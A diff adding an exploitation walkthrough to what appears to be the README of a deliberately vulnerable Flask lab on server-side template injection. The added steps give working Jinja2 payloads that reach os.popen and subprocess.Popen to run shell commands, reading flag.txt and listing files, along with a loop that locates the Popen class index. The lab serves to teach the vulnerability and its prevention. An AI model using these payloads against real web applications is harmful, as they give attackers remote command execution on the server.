@@ -35,6 +35,27 @@ SSTI vulnerabilities can lead to:
 
 Your goal is to retrieve the flag from the server flag.txt by exploiting the SSTI vulnerability in the web application.
 
+## Exploitation
+
+1. Visit http://localhost:5000 in your browser
+2. In the " Enter your name: " field, enter: `{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}` or 
+
+Finding index of Popen:
+```
+﻿﻿﻿﻿{% for c in ''.__class__.__base__.__subclasses__() %}
+  {% if 'Popen' in c.__name__ %}
+    {{ loop.index0 }}: {{ c }}
+  {% endif %}
+{% endfor %}
+```
+
+`{{ "". __class__.__base__.__subclasses__()[538].Popen("ls", stdout=-1).communicate() }}`
+3. Click "Generate Welcome"
+4. The application will display the flag in response.
+
+
+
+
 ## Prevention Measures
 
 To prevent SSTI vulnerabilities:
